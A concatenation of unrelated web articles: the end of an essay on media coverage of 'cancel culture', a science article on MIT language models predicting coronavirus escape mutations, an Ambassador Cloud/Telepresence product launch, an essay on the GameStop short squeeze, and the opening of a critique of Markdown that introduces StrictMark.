analysis meant to gauge the effectiveness of protest methods in the face of a hostile majority, not to comment on their justifications or level of cost. Jennifer Brea, Omar Wasow’s wife, recently <a href="https://twitter.com/jenbrea/status/1271148784316108800?s=20" rel="noopener" target="_blank"><span>took to Twitter</span></a> to describe her surprise at what had occurred. A collective perception of offense combined with inadequate fact-checking, resulting in the loss of a person’s livelihood.&nbsp;</p>
<p>Another recent example of overzealous cancellation occurred when Lauren Wolfe, a now-former editor for the <em>New York Times</em> tweeted that she had “chills” watching then President-elect Biden’s plane land for inauguration. The backlash, largely from right-leaning outlets such as the <a href="https://www.dailymail.co.uk/news/article-9176225/New-York-Times-cancels-editors-contract-tweeted-chills-watching-Biden.html" rel="noopener" target="_blank"><em><span>Daily Mail</span></em></a>, <a href="https://nypost.com/2021/01/22/ny-times-ousts-editor-who-said-she-had-chills-watching-biden-plane-land/" rel="noopener" target="_blank"><em><span>New York Post</span></em></a>, and <a href="https://www.foxnews.com/media/new-york-times-lauren-wolfe-biden-i-have-chills" rel="noopener" target="_blank"><span>Fox News</span></a>, resulted in the <em>New York Times</em> cancelling Ms. Wolfe’s contract. Importantly, these outlets did not explicitly call for Wolfe to be fired. Instead, they magnified ridicule of the <em>New York Times</em> and suggested that she was emblematic of the newspaper’s left-leaning bias. While this was not a call for her to lose her job, it did incentivize the paper to end her employment in pursuit of impartiality. Further, Ms. Wolfe has <a href="https://www.vox.com/2021/1/24/22247390/lauren-wolfe-new-york-times-tweet-chills" rel="noopener" target="_blank"><span>stated</span></a> that she has received threats and, due to the loss of her job, is now in a precarious financial position.&nbsp;</p>
<div><p>In this scenario, the pressure from traditionally right-leaning outlets stands in stark contrast to their <a href="https://www.foxnews.com/search-results/search?q=cancel%20culture" rel="noopener" target="_blank"><span>repeated</span></a> condemnation of "cancel culture." Still, it was the left-leaning <em>New York Times</em>, which has published pieces <a href="https://www.nytimes.com/2018/06/28/style/is-it-canceled.html" rel="noopener" target="_blank"><span>minimizing</span></a> the effects of "cancel culture," that ultimately fired her. In this way, Lauren Wolfe became the victim of hypocrisy from media across the political spectrum.</p></div>
<h4><strong>The Politicization Of The Term</strong></h4>
<p>In contrast to the above, some politicians, such as Senator Josh Hawley, have embraced the media as an outlet for his repetitive claims of “cancel culture” occurring.&nbsp; Last year, he was asserting that <a href="https://twitter.com/HawleyMO/status/1275762902285406210" rel="noopener" target="_blank"><span>the removal</span></a> of Confederate statues was "cancel culture." These days, he <a href="https://abc7news.com/josh-hawley-fist-capitol-police-simon-and-schuster-book-deal/9468139/" rel="noopener" target="_blank"><span>claims</span></a> that he himself is being “cancelled” over his support for contesting President Biden’s electoral victory. In an essay published by the <a href="https://nypost.com/2021/01/24/its-time-to-stand-up-against-the-muzzling-of-america/" rel="noopener" target="_blank"><em><span>New York Post</span></em></a>, he emulates the <em>Wall Street Journal</em>’s Peggy Noonan in <a href="https://www.wsj.com/articles/get-ready-for-the-struggle-session-11552003346" rel="noopener" target="_blank"><span>likening</span></a> “cancel culture” to the state of free speech in China. The strength of this comparison is debatable, as the U.S. <a href="https://rsf.org/en/united-states" rel="noopener" target="_blank"><span>ranks</span></a> 45th in Reporters Without Borders’ press freedom index whereas China <a href="https://rsf.org/en/china" rel="noopener" target="_blank"><span>ranks</span></a> 177th.&nbsp;</p>
<div><p>More importantly, Senator Hawley still has his job and key committee <a href="https://www.hawley.senate.gov/committee-assignments" rel="noopener" target="_blank"><span>assignments</span></a>, a new <a href="https://www.latimes.com/entertainment-arts/books/story/2021-01-18/sen-josh-hawley-book-deal-regnery" rel="noopener" target="_blank"><span>book deal</span></a>, and access to a <a href="https://twitter.com/HawleyMO" rel="noopener" target="_blank"><span>platform</span></a> read by millions. Still, articles published in the right-leaning <a href="https://www.dailymail.co.uk/news/article-9184433/Hawley-claims-hes-canceled-corporate-America-says-wont-muzzled-left.html" rel="noopener" target="_blank"><em><span>Daily Mail</span></em></a> and <a href="https://nypost.com/2021/01/24/its-time-to-stand-up-against-the-muzzling-of-america/" rel="noopener" target="_blank"><em><span>New York Post </span></em></a>focus on online outrage in response to his actions rather than the lack of actual consequences that seem to be occurring. This selective framing is a key way in which media publications perpetuate a malleable definition of “cancel culture.”</p></div>
<h4><strong>How "Cancel Culture" Is Reported</strong></h4>
<p>Media outlets and publishers that align with the political left or right have palpable differences in how they report incidents of alleged “cancel culture.” Often, however, key perspectives originate from, or are amplified by, elected leaders. For example, Republican Representative Matt Gaetz <a href="https://twitter.com/RepMattGaetz/status/1353772373049282560" rel="noopener" target="_blank"><span>likened</span></a> the impeachment of former President Trump to “cancel culture.” Across the aisle, Democratic Representative Alexandria Ocasio-Cortez has minimized fears of "cancel culture" as being <a href="https://twitter.com/AOC/status/1281394730232946691" rel="noopener" target="_blank"><span>overblown</span></a>, citing conservatives' own efforts to get her “cancelled.”&nbsp;</p>
<p>In the media sphere, this political divide is mirrored by pieces in right-leaning outlets that paint "cancel culture" as a legitimate threat to free speech. <a href="https://www.nationalreview.com/2020/06/cancel-cancel-culture/" rel="noopener" target="_blank"><span>There</span></a> <a href="https://www.nationalreview.com/2021/01/is-the-wisdom-of-homer-immune-to-cancel-culture/" rel="noopener" target="_blank"><span>are</span></a> <a href="https://www.theamericanconservative.com/prufrock/dangerous-ideas-and-our-cancel-culture/" rel="noopener" target="_blank"><span>many</span></a> <a href="https://www.theamericanconservative.com/articles/concentrated-capital-fuels-cancel-culture/" rel="noopener" target="_blank"><span>examples</span></a> <a href="https://thefederalist.com/2019/10/31/obama-is-right-to-criticize-cancel-culture-but-the-left-isnt-listening/" rel="noopener" target="_blank"><span>of</span></a> <a href="https://reason.com/2021/01/07/the-capitol-rioters-were-a-right-wing-cancel-mob/" rel="noopener" target="_blank"><span>such</span></a> <a href="https://reason.com/2020/08/07/cancel-culture-is-a-dangerous-totalitarian-trend/" rel="noopener" target="_blank"><span>pieces</span></a>. In one instance, former Republican Senator Orrin Hatch utilized the <em>Wall Street Journal’s</em> Opinion Section to <a href="https://www.wsj.com/articles/higher-ed-and-the-fragmentation-of-america-11595865575" rel="noopener" target="_blank"><span>equate</span></a> “cancel culture” to the deadly Spanish Inquisition. Going even further, right-leaning publications sometimes claim that this behavior was <a href="https://dailycaller.com/2019/09/04/rnc-ronna-mcdaniel-cancel-culture-debra-messing-mccormack-frightening/" rel="noopener" target="_blank"><span>deliberately</span></a> unleashed by “the Left” to silence political opposition.&nbsp;</p>
<p>Meanwhile, the archetypal left-leaning outlet more frequently <a href="https://time.com/5735403/cancel-culture-is-not-real/" rel="noopener" target="_blank"><span>minimizes</span></a> fears over "cancel culture" by suggesting that the incident involves justified repercussions or identifying the ways in which a “cancelled” individual <a href="https://www.nytimes.com/2018/06/28/style/is-it-canceled.html" rel="noopener" target="_blank"><span>maintained</span></a> their fanbase. This <a href="https://newrepublic.com/article/155141/cancel-culture-con-dave-chappelle-shane-gillis" rel="noopener" target="_blank"><span>piece</span></a> published in the left-leaning <em>New Republic</em> minimizes fears over “cancel culture” by regarding it as “ordinary public disfavor voiced by ordinary people.” Similarly, the <em>New Statesman</em> published an <a href="https://www.newstatesman.com/science-tech/2020/07/cancel-culture-does-not-exist" rel="noopener" target="_blank"><span>article</span></a> bluntly titled “‘Cancel culture’ does not exist.”&nbsp;</p>
<div><p>Indeed, there are few voices who <a href="https://www.nytimes.com/2019/08/17/opinion/sunday/cancel-culture-call-out.html" rel="noopener" target="_blank"><span>describe</span></a> "cancel culture" as a legitimate threat to individuals without fame or power but not an existential threat to free speech. One person who promotes this <a href="https://www.washingtonpost.com/outlook/2020/07/09/cancel-culture-is-real-problem-not-people-warning-about-it/" rel="noopener" target="_blank"><span>description</span></a> is Phoebe Maltz Bovy, a signatory of the <em>Harper’s</em> letter. Weeks after signing, she came to realize a central paradox: “the loudest voices on the topic are those with careers as contrarians.” While Ms. Maltz Bovy had signed the letter to protect the everyday author, she later realized she may have also been defending controversial elites.</p></div>
<h4><strong>Striking the Right Balance</strong></h4>
<p>By identifying the haphazard way in which claims of “cancel culture” are promoted in the media, one can more cautiously approach the topic. Readers must demand specific information from stories of this nature and seek out alternate perspectives on the same topic. As the sheer quantity of daily media continues to grow, ensuring <a href="https://blog.thefactual.com/why-is-the-news-biased" rel="noopener" target="_blank"><span>balance</span></a> and quality in our news diet is essential.&nbsp;</p>
<p>As society becomes more <a href="https://knightfoundation.org/wp-content/uploads/2020/08/American-Views-2020-Trust-Media-and-Democracy.pdf" rel="noopener" target="_blank"><span>partisan</span></a>, it's important for all of us to engage in respectful, good-faith discussion across political lines. When moderate Americans are <a href="https://www.pewresearch.org/fact-tank/2016/07/20/in-political-correctness-debate-most-americans-think-too-many-people-are-easily-offended/" rel="noopener" target="_blank"><span>afraid</span></a> to voice their views, it allows those who operate at political extremes<span>—</span>often in bad-faith<span>—</span>to dominate the discussion.</p>

			<p><span>R</span>elief coursed through me last week when I learned my 2-year-old daughter’s daycare provider got her first dose of the Pfizer vaccine. It left her feeling more groggy than she expected, but that was a good thing, suggesting the vaccine was kicking her immune system into gear.</p><p>While I was grateful her vaccination reduced the risk of exposure in my social pod, I was reading about new genetic variants of SARS-CoV-2 from the United Kingdom, South Africa, and Brazil. At a recent press conference, Anthony Fauci, chief medical advisor to President Biden, said the current Pfizer and Moderna vaccines, when confronting the new mutations, were still “well above the line of not being effective.” That’s reassuring, of course, until you consider that vaccines, battling mutations, can fall below the line of effectiveness. That’s not the fault of vaccine design, it’s the result of nature’s design. As long as the virus continues to find new human hosts, it will continue to evolve mutations to escape our immune defenses.</p><p>“The more people infected, the more likely that we will see new variants,” Michel Nussenzweig, a Rockefeller University immunologist, <a href="https://www.nytimes.com/2021/01/25/health/coronavirus-moderna-vaccine-variant.html" target="_blank">told</a> <i>The New York Times</i>. “If we give the virus a chance to do its worst, it will.”</p><blockquote><p>Both the U.K and the South Africa coronavirus variants have high escape potential.</p> </blockquote><p>Thankfully, scientists are on the case figuring out what form the virus’ worst may take next. A team at the Massachusetts Institute of Technology that includes a biological engineer, a computational biologist, and a mathematician, has come up with a novel way of predicting which SARS-CoV-2 mutations can escape the human immune system. Their research could help vaccine makers stay one step ahead of evolution and cut off deadly mutations at the pass. In a new <a href="https://science.sciencemag.org/content/371/6526/284" target="_blank">paper</a>, published in <i>Science</i> with the enticing title, “Learning the language of viral evolution and escape,” the scientists elucidate a promising bridge between ideas about natural language, like grammar and meaning, and how viruses and bacteria, among other things, evolve. “We’re taking steps toward understanding the language of biology,” said Bonnie Berger, one of the paper’s authors.<br></p><p>Berger and coauthors Bryan Bryson and Brian Hie recently joined me on Zoom to explain their research. Their work stems from the thorny—or perhaps I should say “spikey”—ability of viruses to mutate in ways that allow them to evade our immune system. It is, after all, SARS-CoV-2’s spike protein, a <a href="https://www.annualreviews.org/doi/abs/10.1146/annurev-virology-110615-042301" target="_blank">multifunctional molecular machine</a>, that helps the virus break into our cells. As a <a href="https://www.thelancet.com/journals/laninf/article/PIIS1473-3099(21)00007-4/fulltext" target="_blank">report</a> this month in <i>The Lancet</i> noted, the variant that recently arose in the U.K., which is “rapidly becoming a global threat,” is characterized by “multiple mutations in the spike protein.” The Moderna and Pfizer vaccines work against SARS-CoV-2 by giving our cells <a href="https://www.cdc.gov/coronavirus/2019-ncov/vaccines/different-vaccines/mrna.html" target="_blank">instructions</a> on how to make a harmless piece of the virus’ spike protein; that information sets up our immune system to effectively fight off the virus.&nbsp;When the spike protein changes, however, it can become harder for our immune system to recognize and, ultimately, thwart.</p><p>Berger heads the Computation and Biology group at MIT’s Computer Science and Artificial Intelligence Lab. She explained that mutations in the original Wuhan strand should be investigated for “semantic change,” which “could lead to escape.” A semantic change, or change in meaning, in a protein comes down to its amino-acid sequences, which follow a set of rules. A protein is a polypeptide chain of amino acids, letters in the 20-character protein “alphabet” that code for a particular protein structure and purpose. The sequences of these letters, joined to each other with peptide bonds, are transcribed and translated from DNA and RNA—or, in the case of SARS-CoV-2, just RNA. For the virus’s spike protein to link successfully to our cells, its sequence has to adhere to a syntax. “We think of that as a biological grammar,” said Hie, a doctoral candidate at the Computer Science and Artificial Intelligence Lab at MIT.</p><div>

<p>By John  Upton</p>

Sometime in 2004, a pig was trucked with a herd of others to Sheung Shui Slaughterhouse, Hong Kong’s largest abattoir. It could have been shipped from any number of farms in China. The pig was penned in cramped conditions and...<strong><a href="http://m.nautil.us/issue/3/In%20Transit/when-pigs-fly" data-trval="when-pigs-fly" data-trlbl="foc_rec" data-tract="internal_art">READ MORE</a></strong>

</div><p>To escape the immune system’s search-and-destroy cells, Hie said, the virus must camouflage itself. In <i>Science</i>, the authors write, “We identified escape mutations as those that preserve viral infectivity but cause a virus to look different to the immune system, akin to word changes that preserve a sentence’s grammaticality but change its meaning.” This clever rewrite, Berger said, is evolution at work. “Evolution is a language,” she said. “Its language developed like English developed—over time. Protein sequences, or nucleic acid sequences, develop over time.”</p><p>The scientists designed machine-learning algorithms, originally created to work with human languages like English, to identify the new “words” in the virus’ protein sequences. “The same principles used to train a language model on a sequence of English words can train a language model on a sequence of amino acids,” they write. Fundamentally, Hie said, the algorithms work like sentence-completion models, such as the autocorrect and autocomplete functions in the iPhone and Google’s Gmail.</p><blockquote><p>If we give the virus a chance to do its worst, it will.</p> </blockquote><p>They trained their language model on 4,172 spike protein sequences, much less than what was available to work with for proteins associated with other viruses, for which the researchers also created language models to predict viral escape—44,851 sequences of a protein in the influenza A virus, and 57,730 sequences of a protein in the HIV virus. They found that the degree of a protein sequence’s grammatical correctness, according to their language models, was significantly correlated with viral fitness “across all strains and across studies that examined single or combinatorial mutations,” despite the fact that their language models “were not given any explicit fitness-related information.” This suggests that a mutation’s “grammaticality” actually captures information about how fit that mutation is for infecting people. It also, the researchers said, increases the dimensions of scientists’ understanding of how a change in meaning can encode the perturbing of a protein’s purpose.<br></p><p>Bryson is a member of the Ragon Institute at Massachusetts General Hospital and heads his own lab at MIT’s Biological Engineering department. He put it this way: “We’ve blasted the doors open with CSCS in terms of an intellectual paradigm.” CSCS stands for constrained semantic change search. It’s the task of looking for mutations to the spike protein with both high grammaticality and high semantic change. There’s not really an analog for doing this usefully on some body of text in the English language. And that’s the point. “Before, people would just look at grammaticality of English or the meaning, the semantics,” Berger said. “But looking for escape—high grammaticality and high semantic change—you wouldn’t do that for the English language, which is why we came up with a new natural-language processing model. Natural-language processing drove the solving of a biological problem.”<br></p><p>In Bryson’s lab, scientists can now experiment with spike-protein mutants. “We’re saying, ‘OK, we can generate this,’” Bryson said. “In our model, it falls in the 98th percentile.” That means if you compare this mutant’s sequence to previously seen coronavirus sequences, then 98 percent of those previously seen coronavirus sequences have lower semantic change, as predicted by the model, than the mutant. “We can see how well it infects cells,” Bryson said. “We can ask, ‘How well does it bind the receptor ACE2?’—the cellular doorway the spike protein opens to cause COVID-19—‘How well does it survive in the presence of antibodies?’ We now have a little bit more understanding of how semantic changes relate to all of the biological features of infection.”</p><blockquote><p>A mutation’s “grammaticality” actually captures information about how fit that mutation is for infecting people.</p> </blockquote><p>Both the U.K and the South Africa variants have, according to the researchers’ model, high escape potential. The latter scored higher for semantic change than the former. “Those may be prone to escape and may not be targeted by the vaccine, but that needs to be experimentally verified,” Berger said. “We’re just doing quantitative prediction.”</p><p>I asked the scientists how the development of our current vaccines might have been different if Moderna and Pfizer knew about this language of viral escape. Bryson said, “I think our model underscores the importance of using the full length of the spike as an immunogen, as opposed to prioritizing particular regions of the protein over others.” He said it is fortunate that a lot of the vaccine designs are focused on the full-length spike protein, which their model suggests is a good move. At the same time, Bryson warned, “our model does quantify certain parts of the protein as having high escape potential.”</p><p>However, with that knowledge, Bryson said, chemists could fine-tune vaccines to target the sequences most likely to escape. “We could say, OK, even as we get more and more sequences, how can we think about designing new vaccine strategies that focus the immune response on this particular region of the protein?” In the computer, he explained, he could generate new spike mutations and determine (to use the language metaphor) whether they change the meaning of the protein sequence and become dangerous. Based on that modeling, Bryson said, “We can do deep virology, immunology, antibody-binding—all these types of experiments that allow us to explore those pieces.”</p><p>The team is looking to take their model to uncharted territory beyond protein sequences. “This conceptual framework is not limited to immune selection and immune escape, but can generalize …</p></div></div>

Suddenly, our developers were limited by slow feedback loops and resource-constrained development environments. Because of these challenges, it took us longer to ship new features than it did before.</p><p id="f9d9">In early 2017 we built <a href="https://www.telepresence.io/" rel="noopener">Telepresence</a> to address our own development challenges with Kubernetes. After talking with the community we quickly realized that our challenges with Kubernetes development were not unique, so we open sourced it, and in May 2018, we donated it to the CNCF to help grow the community. Today, Telepresence is used by thousands of developers to improve their day-to-day development experience on Kubernetes.</p><p id="e657">As more organizations have adopted Kubernetes and Telepresence, we’ve found that many struggle to scale the newfound efficiency of a single developer and apply it to entire teams. We’ve talked to many Telepresence users who love the tool but have struggled to use it to collaborate with colleagues who are newer to Kubernetes. To succeed with Kubernetes, organizations must have <a href="https://www.getambassador.io/use-case/local-kubernetes-development/" rel="noopener">super efficient development <em>teams</em></a>, not just a few super efficient developers.</p><p id="45fc">Today, we are excited to introduce Ambassador Cloud to make the whole development team faster and more efficient. <a href="https://www.getambassador.io/products/telepresence/" rel="noopener">Powered by Telepresence</a>, Ambassador Cloud now combines all of the best features of Telepresence with a new focus on fostering easy collaboration among teammates. And, we’re making Ambassador Cloud free to get started for teams of any size!</p><p id="7c1c">In the transition from a monolith to a cloud native application, developers face challenges when their application becomes too complex to run on their local machine. With Kubernetes, this barrier is hit quickly as dependencies grow and more services are added to the application. Suddenly, laptop fans are spinning constantly because they don’t have enough memory to run the application and feature development takes longer and longer.</p><p id="59bf">With Telepresence, developers have access to infinite-scale development environments. Instead of running the entire application on their local machine, Telepresence sets up a proxy so that developers can run a copy of a service on their local machine while bridging to their remote dependencies.</p><p id="8074">Today, we’ve added support for this use case into Ambassador Cloud. Now powered by Telepresence, Ambassador Cloud makes it possible for developers to develop on Kubernetes microservices no matter the resource constraints of their local machines.</p><p id="1565">Modern software development requires frequent input from teammates, but sharing context takes up a lot of time when everyone is working in their own development environment. Ambassador Cloud reduces the time it takes for developers to share context by providing them with tools that foster seamless collaboration.</p><h2 id="dc02">🆕 Intercepts</h2><p id="e61c">Intercepts enable developers to test and debug services locally without needing to run dependent services or redeploy to your cluster on every code change. Intercepts are an extension of the `swap-deployment` concept in the original Telepresence. In contrast with `swap-deployment` though, intercepts make it possible for multiple developers to be working on the same service at the same time. We inject a Telepresence proxy sidecar into a pod in order to intercept traffic, rather than swapping the entire deployment with a two-way proxy, and make it much easier to manage multiple intercepts.</p><h2 id="bf95">🆕 Preview URLs</h2><p id="961f">For each intercepted service, Ambassador Cloud automatically generates a preview URL so that developers can easily share access to their environment with teammates. This eliminates the need for developers to spend hours attempting to reproduce bugs on their own. Sharing access to intercepts via a preview URL is also a great way to effectively pair program using the same cluster.</p><p id="e575">When a preview URL is sent, the recipient is required to login with a GitHub account affiliated with the same organization as the sender. This is to ensure preview URLs are sent safely, and can only be accessed by your teammates.</p><h2 id="4e79">🆕 Cloud Dashboard</h2><p id="281f">Ambassador’s cloud dashboard makes it easy for developers to track the services they have intercepted, the preview URLs they have shared, and which team members have accessed their preview URLs.</p><figure><div></div></figure><p id="8ea9">Like what you see? <a href="http://bit.ly/ambassadordemo" rel="noopener">Share it with your friends</a>! To learn more about the new features in Ambassador Cloud, check out <a href="https://www.getambassador.io/products/telepresence" rel="noopener">our website</a>.</p><p id="355e">We’re excited to share some new features with the Telepresence community. To better support collaboration for development teams, we needed to make some changes to Telepresence:</p><ul><li id="fa91">We’ve rewritten Telepresence from Python to Go to make it faster.</li><li id="31c3">A sidecar proxy is now deployed next to the service you are intercepting, making Telepresence more reliable and giving end users more control over traffic routing.</li><li id="bd15">A new persistent in-cluster Telepresence agent allows you to set RBAC permissions at the cluster-level. This agent also enables auto-reconnect support. This makes Telepresence easier for developers to install, and easier for DevOps or platform teams to manage.</li><li id="8941">A simplified command line interface makes Telepresence easier to use.</li></ul><p id="b813">This version of Telepresence that powers Ambassador Cloud will be open sourced in time for KubeCon EU. We prioritized releasing the binary as soon as possible in order to get feedback from the community. We are looking forward to taking these learnings and contributing them back to the open source community soon. If you have feedback on how Telepresence works for you, <a href="https://www.getambassador.io/feedback" rel="noopener">we’d love to hear it</a>!</p><p id="d20d">Ambassador Cloud is generally available today and is free for teams of any size.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                                <p>GameStop, a struggling, mall-based video games retailer, has topped the business news this week. In part, this is because its common stock (ticker: GME) has seen an incredible run-up in price. But the story has also garnered a lot of attention because the media is portraying the company as the latest battleground between populism and the establishment.</p>
<p>On one side are the hedge funds that have bet against GameStop by short selling GME. That’s to say, hedge funds have borrowed the company’s stock, sold it and are betting that they can buy it back at a lower price. On the other side are the investors, including retail investors on Reddit’s r/wallstreetbets, who are betting on GameStop stock to go up. Moreover, they’re buying GME and encouraging other investors to do the same to push up the price of the stock and bankrupt the hedge funds that have shorted it.</p>
<p>Bulls and bears have fought for as long as we’ve had financial markets. The difference now? The increasing availability of derivatives to retail traders, who can use these sophisticated investment products to lever returns. For example, consider a vanilla call option. Owning a call on GME gives me the right (but not the obligation) to purchase a share of GME at a fixed price (called the strike) and on a fixed date (called the expiry).</p>
<p>Let’s use some illustrative numbers. Suppose I bought a call on GME back on Jan. 4 with a strike of $250 and an expiry of Jan. 27. The fair price of this option would have been very cheap, say a few dollars or less. Why? For the call to have a positive payoff, termed being “in the money,” GME would have had to rise from $20 (the price on the 4th) to above $250 (the strike) by the expiry. Essentially, buying the GME call would have been a bet on incredible levels of stock price volatility.</p>
<p>As it turns out, that’s what happened. Since GME closed at about $350 on Jan. 27, the payoff of that single call (purchased for pocket change) would have been $100. That’s because exercising the call gets the owner a share of GME (worth $350) at the strike price ($250). That’s a return of two orders of magnitude greater than the initial investment. In this way, close-to-expiry, far out-of-the-money call options allow for extremely leveraged bets. Like a lottery ticket or roulette wheel spin, these calls may only cost a few dollars but have a possibility of unlimited profit. The allure of stock speculation? Like poker, you’re playing against real humans. If you can outsmart them, then you can eat their lunch. And now we can do it during lunch on our phones.</p>
<p>With GameStop, we have a classic short squeeze. When the price of GME rises, the investment banks and brokerage firms that lent out the stock require that the short sellers provide more collateral. To do this, the shorts might have to sell their existing positions in other stocks at bad prices to quickly raise cash. Worse, the lenders can immediately call the loaned stock back. The short seller is then forced to buy back the stock at a higher price than they originally sold it at, often taking a bath. In the short sellers’ scramble to cover their shorts, the GME price rises further. Because stock prices have unlimited potential to rise, the short seller is exposed to potentially unlimited losses. Therefore, in a short squeeze, the short sellers risk bankruptcy even if they are ultimately right about the fair value of the stock. But, as John Maynard Keynes is reputed to have said, “The market can stay irrational longer than you can stay solvent.”</p>
<p>But is the run-up in GME price irrational? Does it illustrate the inefficiency of financial markets, like a modern version of tulip mania?</p>
<p>First, we should be skeptical of bite-sized economic history. Case in point: Keynes never made that quip, <a href="https://www.wsj.com/articles/BL-MB-32547">according to expert historians</a> Robert Skidelsky and Donald Moggridge. And the tulip mania story might also be bust, as historian Peter Garber explains in <em>Famous First Bubbles: The Fundamentals of Early Manias</em>. History has useful economics, but beware history badly done. Still the question remains: Is GME a bubble, born of irrational exuberance?</p>
<p>Bubbles are a favorite topic of my Mercatus colleague Scott Sumner. In the simplest model of an efficient market, stock prices follow a random walk. Since prices instantly and perfectly reflect all available information, price changes are only caused by unexpected news. And since you can’t predict unexpected news, prices evolve randomly. So as Scott has pointed out, even efficient market prices can exhibit bubble-like patterns by chance. Some stock prices will rapidly rise on good news and subsequently collapse on bad news. But you can’t know which stocks ahead of time.<img loading="lazy" src="https://www.discoursemagazine.com/wp-content/uploads/2021/01/Discourse_Graphic_Gamestop-e1611941850710.png" alt="" width="600" height="468"></p>
<p>But there’s a problem applying this reasoning in the GameStop case. What news about the company’s business could have plausibly driven the large swings in GME? The stock price steadily tripled from about $20 at the beginning of January to about $60 roughly three weeks later on the 22nd. Then this week, the stock price and volatility exploded. The share price ran up to nearly $475, amid much bouncing around. For instance, on Thursday, Jan. 28, the stock reached $468 soon after the opening bell, only to fall to $126 about an hour later. To my knowledge, no news about GameStop’s business explains these swings. I suspect the truth mixes rationality and human psychology. Here’s my theory:</p>
<p>For starters, the hedge funds shorting GME got greedy. More shares of GME have been shorted than there are shares of GME outstanding. This fact means that if all the shorts are called in at the same time, they couldn’t all be covered. Moreover, GameStop isn’t obviously destined for failure. I don’t give financial advice and haven’t taken either side of the GME trade. But in the same way that some investors are pessimistic about GME, other investors are optimistic about GME. Both sets of investors try to convince the public of their view. This is perfectly normal. The key difference here? The optimistic GME investors have realized the vulnerable position of the short sellers, and they’ve coordinated to expose it. Why GME and not another stock? Because gamers like GameStop.</p>
<p>In this way, bidding up the price of GME is akin to a bank run or a foreign-exchange speculative attack. Investors realize, often suddenly and simultaneously, “If something cannot go on forever, it will stop.” The realization leads to coordinated action by self-interested individuals—<a href="https://www.adamsmithworks.org/documents/spontaneous-order-in-adam-smith">Smithian spontaneous order</a>—causing the unsustainable arrangement to collapse. Some call it creative destruction; others call it financial instability. Your language might depend on whether you’ve gained or lost.</p>
<p>Wednesday, the Securities and Exchange Commission (SEC) <a href="https://www.sec.gov/news/public-statement/joint-statement-ongoing-market-volatility-2021-01-27">announced</a> that it was “actively monitoring” the situation. And so are Treasury Secretary Janet Yellen and other Biden administration officials, <a href="https://www.reuters.com/article/us-gamestop-white-house/white-house-monitoring-situation-involving-gamestop-other-firms-idUSKBN29W2I1">according to White House Press Secretary Jen Psaki</a>. The SEC and other securities regulators may be concerned that the GameStop short squeeze is an illegal form of market manipulation, a notoriously vague crime under U.S. securities law. I’m not a lawyer and can’t offer a legal opinion.</p>
<p>Nevertheless, retail investors must not be prosecuted simply because they were on the winning side of a trade and used colorful language on the internet. Hedge funds are sophisticated financial market actors that are responsible for managing their own risk. SEC regulations prohibit the general public from investing in them under their “accredited investor” rules. And as SEC officials regularly point out in their indictments, professional traders also use colorful language in their chats. So, let’s be fair. Absent an underlying crime, when hedge funds leave a free lunch on the table, don’t punish retail traders for eating it.</p>
<p>Like GameStop, I say: Power to the players.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<p><a href="https://daringfireball.net/projects/markdown/">Markdown</a> is a wonderful lightweight markup: minimalistic,
easy to read and write. Markdown is supported by GitHub,
Bitbucket, Reddit, Diaspora, Stack Exchange, and many others.
It is not without issues though.  Markdown is precedent-based,
so to say.  It aimed to codify preexisting practices which
were... diverse.  For that reason, it is messy and inconsistent
between implementations.  </p>
<p>StrictMark is a rational <em>subset</em> of Markdown that implements
all the features with the shortest <em>formal</em> grammar possible.
Hence, uniform syntax and no ambiguities.  The idea is that
StrictMark can reuse all the existing Markdown support,
without sharing the weight of the legacy syntax and its
incidental complexity.</p>
<p>StrictMark is Markdown, refactored.</p>
<h2>Markdown critique</h2>
<p>Markdown implementations are inconsistent. Vim highlights it one
way, VS Code does it differently, and the resulting HTML is yet
another thing. A textbook fix for inconsistent implementations
is having a <em>formal grammar</em>.  That might be either a proper
<a href="https://en.wikipedia.org/wiki/Extended_Backus%E2%80%93Naur_form">eBNF</a> grammar or just some regexes in simpler cases.  There
must be something formal and unambiguous.  HTML has it, CSS has
it, every markup or programming language has it.  But Markdown.
Sadly, the syntax itself is so ambiguous that making a formal
grammar becomes a road of pain. For example, HTML (which is
hardly lightweight) has a uniform syntax for its <code>&lt;/elements&gt;</code>.
With Markdown, every element has its own syntax and those
syntaxes interact.  Markdown formal grammar was attempted in the
past, but if you ask me, the result was underwhelming. The <a href="https://en.wikipedia.org/wiki/Extended_Backus%E2%80%93Naur_form">PEG
based grammar</a> is 700 lines long. For a <em>minimalistic</em>
markup, that is <strong>a lot</strong>. So ironic.</p>
<p><a href="http://commonmark.org/">CommonMark</a> is a Markdown codification effort that produced
the most complete spec so far.  Still, that spec is
rule-and-exception based, no grammar.  The text of the spec is
full of "legalese":</p>
<blockquote><p>Â«An indented code block cannot interrupt a paragraph, so
there must be a blank line between a paragraph and a
following indented code blockÂ»</p></blockquote>
<p>Here it describes the specifics of interrelations between two
particular markup elements. But <code>N</code> elements produce <code>N*N</code>
relations!  Consider that ATX headings are always single-line
while Setext headings can be multiline. Why? Because the spec
says so. It is one big heap of rules and another one of
exceptions. That's why it advises a "parsing strategy" and
not a parser generator.</p>
<p>Whether the CommonMak spec has fixed all the corner cases and
ambiguities is unclear.  Or maybe clear, as the spec is actively
revised. So is the code.  The CommonMark C parser is 10KLoC of
hand-written code.  It has plenty of exceptions and tweaks.
While writing <a href="http://doc.replicated.cc/%5EWiki/ron.sm">RON</a> docs, I ran into issues immediately;
had to use the HEAD version which has those issues fixed.</p>
<p>Overall, that seemingly theoretical grammar problem causes
plenty of <em>accidental complexity</em>.  Markdown is messy and hard
to reason about;  it is not always clear how to interpret a
given construct.  That combinatorial mess may not be a problem
for its current uses, of course.  (Although, I highly doubt
that.) After all, the existing libcmark parser is fuzzed,
thus reasonably reliable.  Still, Markdown is a very shaky
base if you want to build on top of it.  To build something
more advanced than a README.  Like, full WYSIWYG editing or
diff highlighting or other complex behavior.</p>
<h2>StrictMark principles</h2>
<p>StrictMark's objective is to make a Markdown <em>subset</em> which is a
<em>proper markup language</em>. To  remove that incidental complexity
by rationalizing the grammar and making it formal.  This
document <a href="http://doc.replicated.cc/%5EWiki/strictmark.sm?@text">is StrictMark</a>.</p>
<p>One may ask, why do I want to make Markdown a proper language?
After all, there is HTML which is proper enough. Yes, HTML is a
widely supported standard, but it is hopelessly elephantine.
Let's think, who can afford to develop/support a proper HTML
engine?  That is roughly one-and-a-half companies in the world.
Hence the interest in a minimalistic hypertext markup language.</p>
<p>The next question is obvious.  If StrictMark is ever used at
some scale, would not it become elephantine, naturally?
Consider Wikipedia/Mediawiki markup.  Once neat and lean like
